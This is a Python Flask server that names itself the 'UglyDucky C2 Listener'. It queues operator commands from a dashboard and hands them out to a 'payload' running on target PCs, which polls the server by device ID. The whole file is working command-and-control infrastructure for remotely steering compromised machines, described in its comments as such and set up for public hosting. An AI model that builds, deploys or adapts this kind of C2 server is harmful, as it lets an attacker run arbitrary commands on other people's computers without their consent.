# This is a simple Flask web server to act as our command queue.
from flask import Flask, request, jsonify

app = Flask(__name__)

# This is a simple, temporary storage for commands.
# For a real-world app, you'd use something like Redis.
# Format: { "DEVICE_ID_1": "COMMAND", "DEVICE_ID_2": "COMMAND" }
command_queue = {}

# The Dashboard sends commands to this endpoint.
@app.route('/issue', methods=['POST'])
def issue_command():
    data = request.json
    device_id = data.get('device_id')
    command = data.get('command')
    
    if not device_id or not command:
        return jsonify({"error": "device_id and command are required"}), 400
        
    # Store the command for the specific device
    command_queue[device_id] = command
    print(f"Queued command '{command}' for device '{device_id}'")
    return jsonify({"status": "command queued"}), 200

# The Payload (target PC) polls this endpoint to get its commands.
@app.route('/poll/<device_id>', methods=['GET'])
def poll_for_command(device_id):
    # Check if there's a command for this device and pop it from the queue
    command = command_queue.pop(device_id, None)
    
    if command:
        print(f"Delivering command '{command}' to device '{device_id}'")
        return jsonify({"command": command})
    else:
        # No command waiting for this device
        return jsonify({"command": None})

# A simple health check endpoint
@app.route('/')
def index():
    return "UglyDucky C2 Listener is online."

if __name__ == '__main__':
    # Port is automatically handled by Render
    app.run(host='0.0.0.0', port=10000)
